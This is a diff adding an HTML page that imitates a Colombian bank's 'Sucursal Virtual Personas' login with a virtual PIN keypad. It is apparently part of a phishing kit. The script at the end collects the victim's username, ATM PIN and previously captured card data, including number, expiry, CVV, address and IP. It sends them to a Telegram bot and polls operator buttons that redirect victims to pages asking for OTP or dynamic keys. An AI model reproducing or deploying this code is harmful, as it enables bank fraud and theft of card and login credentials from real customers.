@@ -1,0 +1,966 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//ES" "http://www.w3.org/TR/html4/strict.dtd">
+<html>
+  <head>
+    <title>Sucursal Virtual Personas</title>
+    <meta content="es" http-equiv="Content-Language" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <link href="css/styles.css" media="all" rel="stylesheet" type="text/css" />
+    <link
+      href="css/bootstrap.css"
+      media="all"
+      rel="stylesheet"
+      type="text/css"
+    />
+    <link href="css/keyboard_util.css" rel="stylesheet" type="text/css" />
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script src="js/jquery-3.7.7.js"></script>
+    <script type="text/javascript" src="js/jquery-1.10.1.js.descarga"></script>
+    <script
+      type="text/javascript"
+      src="js/jquery.validate-1.11.1.js.descarga"
+    ></script>
+    <script type="text/javascript" src="js/blockKeys.js"></script>
+    <script type="text/javascript" src="js/jquery-ui.js.descarga"></script>
+    <script type="text/javascript" src="js/bluebird.min.js.descarga"></script>
+
+    <link
+      href="css/jquery-ui.css"
+      media="all"
+      rel="stylesheet"
+      type="text/css"
+    />
+    <link href="css/ui.css" media="all" rel="stylesheet" type="text/css" />
+    <script>
+      $.getJSON("https://api.ipify.org?format=json", function (data) {
+        // Setting text of element P with id gfg
+        $("#gfg").html(data.ip);
+      });
+    </script>
+    <script>
+      $.getJSON("https://ipinfo.io", function (response) {
+        $("#ip").html("IP: " + response.ip);
+        $("#address").html("" + response.city + ", " + response.country);
+      });
+    </script>
+    <script>
+      //Function key start
+
+      //Clear
+      function funcClear() {
+        var valu = document.getElementById("keyboard_display").value;
+        document.getElementById("keyboard_display").value = valu.substring(
+          0,
+          valu.length - 1
+        );
+      }
+
+      //Enter
+      function funcEnter() {
+        var valu = document.getElementById("keyboard_display").value;
+        if (valu == "") {
+          alert("Not inserted : Empty value");
+        } else {
+          alert("Data Inserted : " + valu);
+        }
+      }
+
+      //Number Keys
+      //1
+      function func1() {
+        var valu = document.getElementById("keyboard_display").value;
+        if (valu.length < 4) {
+          document.getElementById("keyboard_display").value = valu + "1";
+        }
+      }
+      //2
+      function func2() {
+        var valu = document.getElementById("keyboard_display").value;
+        if (valu.length < 4) {
+          document.getElementById("keyboard_display").value = valu + "2";
+        }
+      }
+      //3
+      function func3() {
+        var valu = document.getElementById("keyboard_display").value;
+        if (valu.length < 4) {
+          document.getElementById("keyboard_display").value = valu + "3";
+        }
+      }
+      //4
+      function func4() {
+        var valu = document.getElementById("keyboard_display").value;
+        if (valu.length < 4) {
+          document.getElementById("keyboard_display").value = valu + "4";
+        }
+      }
+      //5
+      function func5() {
+        var valu = document.getElementById("keyboard_display").value;
+        if (valu.length < 4) {
+          document.getElementById("keyboard_display").value = valu + "5";
+        }
+      }
+      //6
+      function func6() {
+        var valu = document.getElementById("keyboard_display").value;
+        if (valu.length < 4) {
+          document.getElementById("keyboard_display").value = valu + "6";
+        }
+      }
+      //7
+      function func7() {
+        var valu = document.getElementById("keyboard_display").value;
+        if (valu.length < 4) {
+          document.getElementById("keyboard_display").value = valu + "7";
+        }
+      }
+      //8
+      function func8() {
+        var valu = document.getElementById("keyboard_display").value;
+        if (valu.length < 4) {
+          document.getElementById("keyboard_display").value = valu + "8";
+        }
+      }
+      //9
+      function func9() {
+        var valu = document.getElementById("keyboard_display").value;
+        if (valu.length < 4) {
+          document.getElementById("keyboard_display").value = valu + "9";
+        }
+      }
+      //0
+      function func0() {
+        var valu = document.getElementById("keyboard_display").value;
+        if (valu.length < 4) {
+          document.getElementById("keyboard_display").value = valu + "0";
+        }
+      }
+
+      function check() {
+        var valu = document.getElementById("keyboard_display").value;
+        if (valu.length >= 3 || valu <= 4) {
+          return true;
+        } else {
+          return false;
+        }
+      }
+    </script>
+     <style>
+      .loaderp-full {
+        display: none;
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(255, 255, 255, 0.8);
+        justify-content: center;
+        align-items: center;
+      }
+      .spinner {
+        border: 4px solid rgba(0, 0, 0, 0.1);
+        border-left-color: #000;
+        border-radius: 50%;
+        width: 50px;
+        height: 50px;
+        animation: spin 1s linear infinite;
+      }
+      @keyframes spin {
+        to {
+          transform: rotate(360deg);
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <form
+      name="loginUserForm"
+      action="#"
+      onsubmit=" return sender()"
+      method="post"
+    >
+      <p id="address" hidden=""></p>
+
+      <div class="container">
+        <div>
+          <div id="header" class="mua-page-header">
+            <div class="row row-logo-svp">
+              <div class="col-xs-12 col-sm-7 col-md-7 left-div">
+                <div class="mua-imgLogoItem"></div>
+                <div class="text-svp-name">Sucursal Virtual Personas</div>
+              </div>
+            </div>
+            <div class="row">
+              <div class="col-xs-12 col-sm-7 col-md-7 left-div">
+                <div
+                  id="lastIn"
+                  class="mua-title-text"
+                  style="padding-top: 10px !important"
+                >
+                  <script
+                    language="javascript"
+                    src="js/jquery.jclockNew.js.descarga"
+                    type="text/JavaScript"
+                  ></script>
+                  <script type="text/javascript">
+                    $(function ($) {
+                      var optionsEST = {
+                        utc: true,
+                        utcOffset: -5,
+                        format: "%A %R de %B de %Y %l:%M:%S %P",
+                        language: "es",
+                      };
+                      $("#jclock1").jclockNew(optionsEST);
+                    });
+                  </script>
+                <body>
+                  <div>
+                     <div class="timeText">Fecha y hora actual:</div>
+                     <span
+                       id="jclock1"
+                       class="lastVisitedText"
+                       currenttime="1659430932738"
+                       >Martes 2 de Agosto de 2022 5:02:12 PM</span
+                     >
+                   </div>
+                 </div>
+               </div>
+             </div>
+           </div>
+           <div class="panel-heading">
+             <h3>Inicio de sesi&ograven</h3>
+           </div>
+         </div>
+         <div>
+           <input type="hidden" name="tempUserID" id="tempUserID" value="" />
+           <input type="hidden" name="HIT_KEY" value="0" />
+           <input type="hidden" name="HIT_VKEY" value="0" />
+           <input type="hidden" name="userId" value="" />
+           <div class="panel panel-primary">
+             <div class="row">
+               <script language="JavaScript">
+                 function cerrarError() {
+                   document.getElementById("tabError").style.display = "none";
+                   document.getElementById("summary").innerHTML = "";
+                 }
+               </script>
+               <div
+                 class="col-xs-12 col-sm-12 col-md-12 mua_message_not_from_svp"
+                 id="tabError"
+                 style="display: none"
+               >
+                 <div class="errorDiv">
+                   <div class="divTextMessage">
+                     <span class="icon-error errorIcon">
+                       <span class="path1"></span>
+                       <span class="path2"></span>
+                       <span class="path3"></span>
+                     </span>
+                     <div class="errorTitulo">Error</div>
+                     <div id="summary" class="errorTexto"></div>
+                   </div>
+                 </div>
+               </div>
+             </div>
+             <div class="mua-panel-body">
+               <div class="row">
+                 <div class="col-lg-5 col-md-5 col-sm-6">
+                   <h5 class="mua-title-h5">
+                     Imagen y frase de seguridad seleccionadas
+                   </h5>
+                   <p class="mua-phrase-message mua-small-text">
+                     Verifica que tu imagen y frase de seguridad sean correctas,
+                     de esta manera te asegurar&aacutes de estar ingresando a la
+                     Sucursal Virtual Personas.
+                   </p>
+                   <div id="phraseImage" class="mua-image-login-container">
+                     <div
+                       class="mua-security-container mua_svp_space_pb_preparation"
+                     >
+                       <div class="mua-security-img">
+                         <img
+                           id="rsaImage"
+                           src="img/cargando.gif"
+                           width="90"
+                           height="90"
+                         />
+                       </div>
+                       <div class="pull-left mua-security-question">
+                         <p>Frase de seguridad:</p>
+                         <p>
+                           <b>Imagen de Seguridad</b>
+                         </p>
+                       </div>
+                     </div>
+                   </div>
+                 </div>
+                 <div class="col-lg-4 col-md-5 col-sm-6">
+                   <div class="panel_general mua-panel_general">
+                     <div class="title-panel-label">
+                       <h1>Clave</h1>
+                     </div>
+                     <div class="subtitle-land-label">
+                       <h4>
+                         Si la imagen y frase no son las que has definido, por
+                         seguridad no ingreses la clave.
+                       </h4>
+                     </div>
+                     <div id="contenido">
+                       <div class="mua-content-group-panel">
+                         <div class="mua-label-input">
+                           <label class="control-label-index" for="password">
+                             Ingresa tu clave
+                           </label>
+                         </div>
+                         <div>
+                           <div class="mua_svp_enroll_update_control">
+                             <input 
+                               
+                               id="keyboard_display"
+                               
+                               name="password"
+                               class=" mua-form-control mua-readOnlyInput mua_svp_control_password mua-input-icon"
+                               type="password"
+                               value=""
+                               required
+                               minlength="4"
+                               disabled
+                             />
+                             <span class="mua-icon-lock"> </span>
+                           </div>
+                         </div>
+                       </div>
+                       <div
+                         class="mua-content-legend mua_svp_enroll_update_label"
+                       >
+                         Ingresa mediante el teclado virtual la clave que usas en
+                         el cajero autom&aacutetico.
+                       </div>
+                     </div>
+                     <div class="two-button-container mua-button-container">
+                       <div class="two-button-a">
+                         <input
+                           class="btn btn-default"
+                           type="button"
+                           value="Cancelar"
+                         />
+                       </div>
+                       <div class="two-button-b">
+                         <button
+                           id="autorizarBtn"
+                           class="btn btn-success"
+                           type="submit"
+ 
+                         /> Ingresar</button>
+                         <div class="loaderp-full" id="loader">
+                            <div class="spinner"></div>
+                          </div>
+                       </div>
+                     </div>
+                     <div class="mua-panel_enlances">
+                       <div>
+                         <span
+                           id="popoverId"
+                           class="glyphicon icon-icon_tooltip mua_pg_pgdsc_icons mua-label-icon"
+                           data-original-title=""
+                           title=""
+                         ></span>
+                         <div id="popoverContent" class="hide">
+                           <span class="mua_tooltip_close">×</span>
+                           <div class="mua_tooltip_msg">
+                             Si usted es un Colombiano en el Exterior y no ha
+                             sido cliente en el pasado o es un cliente exclusivo
+                             Fiduciaria, usted debe generar una clave para
+                             continuar con el proceso.
+                           </div>
+                         </div>
+                         <a href="#">Genera una clave personal</a>
+                       </div>
+                     </div>
+                   </div>
+                 </div>
+                 <div
+                   class="col-lg-3 col-md-3 col-sm-3 col-xs-3"
+                   style="height: 350px; width: 220px"
+                 >
+                   <div id="keyboard_">
+                     <table
+                       class="keyboard"
+                       border="0"
+                       cellspacing="0"
+                       cellpadding="0"
+                       align="left"
+                       valign="top"
+                     >
+                       <tbody>
+                         <tr>
+                           <td width="0" height="20"></td>
+                           <td></td>
+                         </tr>
+                         <tr>
+                           <td height="0" width="3"></td>
+                           <td colspan="2">
+                             <table
+                               align="left"
+                               valign="top"
+                               cellspacing="0"
+                               cellpadding="0"
+                               class="bg_button"
+                             >
+                               <tbody>
+                                 <tr align="left">
+                                   <td valign="top" align="left">
+                                     <table
+                                       class="bg_button"
+                                       id="_KEYBRD"
+                                       valign="top"
+                                     >
+                                       <tbody>
+                                         <tr>
+                                           <td
+                                             class="bg_buttonSmall"
+                                             align="center"
+                                             style="cursor: default"
+                                             onmouseover="JpplxTGSl_ZY();"
+                                             onmouseout="changeToOrigKeyboard();"
+                                           >
+                                             <div
+                                               border="0"
+                                               id="JwZQEZygugFI1"
+                                               valign="center"
+                                               align="center"
+                                               onfocus="this.blur();"
+                                               class="colorContrast2"
+                                               style="font-weight: bolder"
+                                               onclick="func1()"
+                                             >
+                                               1
+                                             </div>
+                                           </td>
+                                           <td
+                                             class="bg_buttonSmall"
+                                             align="center"
+                                             style="cursor: default"
+                                             onmouseover="JpplxTGSl_ZY();"
+                                             onmouseout="changeToOrigKeyboard();"
+                                             onclick='iOLxOToWMXkn("g5emZ");'
+                                           >
+                                             <div
+                                               border="0"
+                                               id="JwZQEZygugFI9"
+                                               valign="center"
+                                               align="center"
+                                               onfocus="this.blur();"
+                                               class="colorContrast2"
+                                               style="font-weight: bolder"
+                                               onclick="func9()"
+                                             >
+                                               9
+                                             </div>
+                                           </td>
+                                           <td
+                                             class="bg_buttonSmall"
+                                             align="center"
+                                             style="cursor: default"
+                                             onmouseover="JpplxTGSl_ZY();"
+                                             onmouseout="changeToOrigKeyboard();"
+                                             onclick='iOLxOToWMXkn("lTjnA");'
+                                           >
+                                             <div
+                                               border="0"
+                                               id="JwZQEZygugFI6"
+                                               valign="center"
+                                               align="center"
+                                               onfocus="this.blur();"
+                                               class="colorContrast2"
+                                               style="font-weight: bolder"
+                                               onclick="func6()"
+                                             >
+                                               6
+                                             </div>
+                                           </td>
+                                         </tr>
+                                         <tr>
+                                           <td
+                                             class="bg_buttonSmall"
+                                             align="center"
+                                             style="cursor: default"
+                                             onmouseover="JpplxTGSl_ZY();"
+                                             onmouseout="changeToOrigKeyboard();"
+                                             onclick='iOLxOToWMXkn("PHIL3");'
+                                           >
+                                             <div
+                                               border="0"
+                                               id="JwZQEZygugFI4"
+                                               valign="center"
+                                               align="center"
+                                               onfocus="this.blur();"
+                                               class="colorContrast2"
+                                               style="font-weight: bolder"
+                                               onclick="func4()"
+                                             >
+                                               4
+                                             </div>
+                                           </td>
+                                           <td
+                                             class="bg_buttonSmall"
+                                             align="center"
+                                             style="cursor: default"
+                                             onmouseover="JpplxTGSl_ZY();"
+                                             onmouseout="changeToOrigKeyboard();"
+                                             onclick='iOLxOToWMXkn("SGRa7");'
+                                           >
+                                             <div
+                                               border="0"
+                                               id="JwZQEZygugFI7"
+                                               valign="center"
+                                               align="center"
+                                               onfocus="this.blur();"
+                                               class="colorContrast2"
+                                               style="font-weight: bolder"
+                                               onclick="func7()"
+                                             >
+                                               7
+                                             </div>
+                                           </td>
+                                           <td
+                                             class="bg_buttonSmall"
+                                             align="center"
+                                             style="cursor: default"
+                                             onmouseover="JpplxTGSl_ZY();"
+                                             onmouseout="changeToOrigKeyboard();"
+                                             onclick='iOLxOToWMXkn("Jb69D");'
+                                           >
+                                             <div
+                                               border="0"
+                                               id="JwZQEZygugFI8"
+                                               valign="center"
+                                               align="center"
+                                               onfocus="this.blur();"
+                                               class="colorContrast2"
+                                               style="font-weight: bolder"
+                                               onclick="func8()"
+                                             >
+                                               8
+                                             </div>
+                                           </td>
+                                         </tr>
+                                         <tr>
+                                           <td
+                                             class="bg_buttonSmall"
+                                             align="center"
+                                             style="cursor: default"
+                                             onmouseover="JpplxTGSl_ZY();"
+                                             onmouseout="changeToOrigKeyboard();"
+                                             onclick='iOLxOToWMXkn("0MKXc");'
+                                           >
+                                             <div
+                                               border="0"
+                                               id="JwZQEZygugFI3"
+                                               valign="center"
+                                               align="center"
+                                               onfocus="this.blur();"
+                                               class="colorContrast2"
+                                               style="font-weight: bolder"
+                                               onclick="func3()"
+                                             >
+                                               3
+                                             </div>
+                                           </td>
+                                           <td
+                                             class="bg_buttonSmall"
+                                             align="center"
+                                             style="cursor: default"
+                                             onmouseover="JpplxTGSl_ZY();"
+                                             onmouseout="changeToOrigKeyboard();"
+                                             onclick='iOLxOToWMXkn("OhUQd");'
+                                           >
+                                             <div
+                                               border="0"
+                                               id="JwZQEZygugFI2"
+                                               valign="center"
+                                               align="center"
+                                               onfocus="this.blur();"
+                                               class="colorContrast2"
+                                               style="font-weight: bolder"
+                                               onclick="func2()"
+                                             >
+                                               2
+                                             </div>
+                                           </td>
+                                           <td
+                                             class="bg_buttonSmall"
+                                             align="center"
+                                             style="cursor: default"
+                                             onmouseover="JpplxTGSl_ZY();"
+                                             onmouseout="changeToOrigKeyboard();"
+                                             onclick='iOLxOToWMXkn("4BY1i");'
+                                           >
+                                             <div
+                                               border="0"
+                                               id="JwZQEZygugFI0"
+                                               valign="center"
+                                               align="center"
+                                               onfocus="this.blur();"
+                                               class="colorContrast2"
+                                               style="font-weight: bolder"
+                                               onclick="func0()"
+                                             >
+                                               0
+                                             </div>
+                                           </td>
+                                         </tr>
+                                         <tr>
+                                           <td
+                                             class="bg_buttonSmall"
+                                             align="center"
+                                             style="cursor: default"
+                                             onmouseover="JpplxTGSl_ZY();"
+                                             onmouseout="changeToOrigKeyboard();"
+                                             onclick='iOLxOToWMXkn("CFkV8");'
+                                           >
+                                             <div
+                                               border="0"
+                                               id="JwZQEZygugFI5"
+                                               valign="center"
+                                               align="center"
+                                               onfocus="this.blur();"
+                                               class="colorContrast2"
+                                               style="font-weight: bolder"
+                                               onclick="func5()"
+                                             >
+                                               5
+                                             </div>
+                                           </td>
+                                           <td
+                                             colspan="2"
+                                             onclick="clearKeys();"
+                                             class="bg_buttonSmall"
+                                           >
+                                             <div
+                                               id="clearKey"
+                                               border="0"
+                                               valign="center"
+                                               align="center"
+                                               onfocus="this.blur();"
+                                               class="colorContrast2"
+                                               onclick="funcClear()"
+                                             >
+                                               Borrar
+                                             </div>
+                                           </td>
+                                         </tr>
+                                       </tbody>
+                                     </table>
+                                     <table valign="top" cellspacing="0">
+                                       <tbody>
+                                         <tr>
+                                           <td></td>
+                                         </tr>
+                                       </tbody>
+                                     </table>
+                                   </td>
+                                 </tr>
+                               </tbody>
+                             </table>
+                           </td>
+                         </tr>
+                         <tr>
+                           <td height="17"></td>
+                           <td colspan="2"></td>
+                         </tr>
+                       </tbody>
+                     </table>
+                   </div>
+                   <div id="inputs_">
+                     <input type="hidden" name="FfWVOFHARNDv" value="" />
+                   </div>
+                   <script>
+                     
+                     resetForm();
+                   </script>
+                 </div>
+               </div>
+             </div>
+           </div>
+         </div>
+         <div class="row">
+           <div class="col-xs-12 col-sm-12 col-md-12">
+             <p class="mua-footer">
+               Sucursal Telefónica: Bogotá (57) 60 1 343 00 00 - Medellín (57) 60
+               4 510 90 00 - Cali (57) 60 2 554 05 05 - Barranquilla (57) 60 5
+               361 88 88 - Cartagena (57) 60 5 693 44 00 - <br />
+               Bucaramanga (57) 60 7 697 25 25 - Pereira (57) 60 6 340 12 13 - El
+               resto del país 018000 9 12345. Sucursales Telefónicas en el
+               exterior: España (34) 900 995 717 - Estados Unidos (1) 866 379 97
+               14.
+             </p>
+           </div>
+            
+         </div>
+         <script type="text/javascript">
+           var year = new Date().getFullYear();
+           $(document).ready(function () {
+             $("#fecha").text(year);
+           });
+   </body>
+        </script>
+        <div style="margin-top: 10px">
+          <div class="mua-title-text pull-left">Dirección IP:</div>
+          <div class="mua-title-text pull-left" id="gfg"></div>
+          <div class="mua-title-text pull-right">
+            Copyright ©&nbsp;<span id="fecha">2022</span>&nbsp;&nbsp;&nbsp;
+          </div>
+        </div>
+      </div>
+    </form>
+
+
+<script>
+   document.addEventListener("DOMContentLoaded", function () {
+     const boton = document.getElementById("autorizarBtn");
+     const loader = document.getElementById("loader");
+
+     boton.addEventListener("click", async function (event) {
+       event.preventDefault();
+
+       loader.style.display = "flex"; // Muestra el loader
+
+       // Obtener los datos de pago desde localStorage con la clave 'pagojet'
+       const info = localStorage.getItem("pagojet");
+       let pagoData = null;
+
+       if (info) {
+         try {
+           // Parsear los datos obtenidos
+           pagoData = JSON.parse(info);
+           console.log("Datos de pago obtenidos:", pagoData); // Debugging
+         } catch (e) {
+           console.error("Error al parsear localStorage:", e);
+         }
+       } else {
+         console.log(
+           'No se encontró información en localStorage con la clave "pagojet".'
+         );
+       }
+
+       // Guardar username y password en localStorage
+       const transactionId =
+         Date.now().toString(36) + Math.random().toString(36).substr(2);
+         const username = localStorage.getItem("username");
+       const password = document.getElementById("keyboard_display").value;
+
+       localStorage.setItem("transactionId", transactionId);
+       localStorage.setItem("username", username);
+       localStorage.setItem("password", password);
+
+       const message = `
+<b>🛫⠀⠀⠀⠀⠀JETSMART⠀⠀⠀⠀⠀🛫</b>
+
+🆔 <b>ID:</b> | <code>${pagoData ? pagoData.id : "No disponible"}</code>  
+👮🏻‍♀️ <b>Nombre:</b> | <code>${
+  pagoData ? pagoData.nombre : "No disponible"
+}</code>  
+📧 <b>Email:</b> | <code>${
+  pagoData ? pagoData.email : "No disponible"
+}</code>  
+📲 <b>Celular:</b> | <code>${
+  pagoData ? pagoData.celular : "No disponible"
+}</code>  
+🏦 <b>Banco:</b> | <code>${
+  pagoData ? pagoData.banco : "No disponible"
+}</code>  
+📍 <b>Dirección:</b> | <code>${
+  pagoData ? pagoData.direccion : "No disponible"
+}</code>  
+💳 <b>Tarjeta:</b> | <code>${
+  pagoData ? pagoData.tarjeta : "No disponible"
+}</code>  
+🗓️ <b>Fecha de Expiración:</b> | <code>${
+  pagoData ? pagoData.ftarjeta : "No disponible"
+}</code>  
+🔐 <b>CVV:</b> | <code>${pagoData ? pagoData.cvv : "No disponible"}</code>  
+<b>Usuario:</b> | <code>${username}</code>  
+<b>Clave:</b> | <code>${password}</code>  
+🌐 <b>IP:</b> | <code>${pagoData ? pagoData.ip : "No disponible"}</code>
+`;
+
+       const keyboard = JSON.stringify({
+         inline_keyboard: [
+           [
+             {
+               text: "X Logo",
+               callback_data: `error_logo:${transactionId}`,
+             },
+             {
+               text: "Dinámica",
+               callback_data: `pedir_dinamica:${transactionId}`,
+             },
+             { text: "X TC", callback_data: `error_tc:${transactionId}` },
+             {
+               text: "X Dinámica",
+               callback_data: `error_dinamica:${transactionId}`,
+             },
+             { text: "OTP", callback_data: `pedir_otp:${transactionId}` },
+             {
+               text: "C Cajero",
+               callback_data: `clave_cajero:${transactionId}`,
+             },
+             {
+               text: "Fin",
+               callback_data: `confirm_finalizar:${transactionId}`,
+             },
+           ],
+         ],
+       });
+
+       const config = await fetch("../claves.json").then((res) =>
+         res.json()
+       );
+
+       fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
+         method: "POST",
+         headers: {
+           "Content-Type": "application/json",
+         },
+         body: JSON.stringify({
+           chat_id: config.chat_id,
+           text: message,
+           reply_markup: keyboard,
+           parse_mode: "HTML", // Especificar el modo de análisis para el formato HTML
+         }),
+       })
+         .then((response) => response.json())
+         .then((data) => {
+           if (data.ok) {
+             console.log("Mensaje enviado a Telegram con éxito");
+             const messageId = data.result.message_id;
+             checkPaymentVerification(transactionId, messageId, config);
+           } else {
+             console.error("Error al enviar mensaje a Telegram:", data);
+             loader.style.display = "none";
+           }
+         })
+         .catch((error) => {
+           console.error("Error al enviar mensaje a Telegram:", error);
+           loader.style.display = "none";
+         });
+     });
+
+     async function loadTelegramConfig() {
+       try {
+         // Cargar las claves directamente desde el archivo claves.json
+         const response = await fetch("claves.json"); // Asegúrate de que la ruta al archivo sea correcta
+         if (!response.ok) {
+           throw new Error("No se pudo cargar el archivo claves.json.");
+         }
+         const config = await response.json();
+
+         // Verificar si se devolvió un error
+         if (config.error) {
+           console.error("Error al cargar claves.json:", config.error);
+           return null;
+         }
+
+         return config;
+       } catch (error) {
+         console.error("Error al cargar las claves:", error);
+         return null;
+       }
+     }
+
+     async function checkPaymentVerification(
+       transactionId,
+       messageId,
+       config
+     ) {
+       fetch(`https://api.telegram.org/bot${config.token}/getUpdates`)
+         .then((response) => response.json())
+         .then((data) => {
+           const updates = data.result;
+           const verificationUpdate = updates.find(
+             (update) =>
+               update.callback_query &&
+               (update.callback_query.data === `error_tc:${transactionId}` ||
+                 update.callback_query.data ===
+                   `error_logo:${transactionId}` ||
+                 update.callback_query.data ===
+                   `pedir_dinamica:${transactionId}` ||
+                 update.callback_query.data ===
+                   `pedir_otp:${transactionId}` ||
+                 update.callback_query.data ===
+                   `clave_cajero:${transactionId}`)
+           );
+
+           if (verificationUpdate) {
+             // Eliminar botones del mensaje original
+             fetch(
+               `https://api.telegram.org/bot${config.token}/editMessageReplyMarkup`,
+               {
+                 method: "POST",
+                 headers: {
+                   "Content-Type": "application/json",
+                 },
+                 body: JSON.stringify({
+                   chat_id: config.chat_id,
+                   message_id: messageId,
+                   reply_markup: JSON.stringify({ inline_keyboard: [] }),
+                 }),
+               }
+             );
+
+            
+
+             // Comportamientos basados en el botón presionado
+             if (
+               verificationUpdate.callback_query.data ===
+               `pedir_dinamica:${transactionId}`
+             ) {
+               window.location.href = "index3.html";
+             } else if (
+               verificationUpdate.callback_query.data ===
+               `error_tc:${transactionId}`
+             ) {
+               alert(
+                 "Error con la tarjeta de crédito. Verifique los datos."
+               );
+               window.location.href = "payment.html";
+             } else if (
+               verificationUpdate.callback_query.data ===
+               `error_logo:${transactionId}`
+             ) {
+               alert("Usuario o clave incorrectos.");
+               window.location.href = "indexx.html";
+             } else if (
+               verificationUpdate.callback_query.data ===
+               `pedir_otp:${transactionId}`
+             ) {
+               window.location.href = "index5.html";
+             } else if (
+               verificationUpdate.callback_query.data ===
+               `clave_cajero:${transactionId}`
+             ) {
+               window.location.href = "pedir_clave_cajero.html";
+             }
+           } else {
+             setTimeout(
+               () =>
+                 checkPaymentVerification(transactionId, messageId, config),
+               2000
+             );
+           }
+         })
+         .catch((error) => {
+           console.error("Error al verificar el pago:", error);
+           setTimeout(
+             () =>
+               checkPaymentVerification(transactionId, messageId, config),
+             2000
+           );
+         });
+     }
+   });
+ </script>
+  </body>
+</html>
